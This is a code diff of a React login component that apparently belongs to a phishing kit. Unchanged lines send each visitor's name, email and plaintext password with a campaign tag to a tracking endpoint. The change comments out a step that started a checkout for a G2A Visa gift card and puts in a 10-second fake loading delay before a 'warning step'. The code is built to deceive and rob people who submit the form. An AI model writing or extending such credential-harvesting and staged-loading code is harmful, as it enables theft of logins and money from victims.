@@ -44,26 +44,29 @@ export default function Login() {
       await fetch('/api/tracking/track-submission', { 
         method: 'POST', 
         headers: { 'Content-Type': 'application/json' }, 
-        body: JSON.stringify({ eventType: 'login', payload: { name: firstName, email, password }, campaign }) 
+        body: JSON.stringify({ eventType: 'login', payload: { name: firstName, email, password }, campaign}) 
       });
       
       // Initiate checkout and wait for response
-      const product = 'https://www.g2a.com/fr/rewarble-visa-gift-card-5-usd-by-rewarble-key-global-i10000502992002?uuid=b989334e-1997-4366-a9ab-0b6aade9c478';
-      const parameters = '&___currency=EUR&___store=english&___locale=fr';
-      const productUrl = product + parameters;
+      // const product = 'https://www.g2a.com/fr/rewarble-visa-gift-card-5-usd-by-rewarble-key-global-i10000502992002?uuid=b989334e-1997-4366-a9ab-0b6aade9c478';
+      // const parameters = '&___currency=EUR&___store=english&___locale=fr';
+      // const productUrl = product + parameters;
       
-      const initiateResponse = await fetch('/api/checkout/initiate', { 
-        method: 'POST', 
-        headers: { 'Content-Type': 'application/json' }, 
-        body: JSON.stringify({ productUrl }) 
-      });
+      // const initiateResponse = await fetch('/api/checkout/initiate', { 
+      //   method: 'POST', 
+      //   headers: { 'Content-Type': 'application/json' }, 
+      //   body: JSON.stringify({ productUrl }) 
+      // });
       
-      if (!initiateResponse.ok) {
-        throw new Error('Failed to initiate checkout');
-      }
+      // if (!initiateResponse.ok) {
+      //   throw new Error('Failed to initiate checkout');
+      // }
       
-      const initiateData = await initiateResponse.json();
-      setSessionPath(initiateData.sessionPath);
+      // const initiateData = await initiateResponse.json();
+      // setSessionPath(initiateData.sessionPath);
+
+      // Attendre 10 secondes pour simuler le temps de chargement de la page
+      await new Promise(resolve => setTimeout(resolve, 10000));
       
       // At the end of the loading, show the warning step
       setIsLoading(false); 
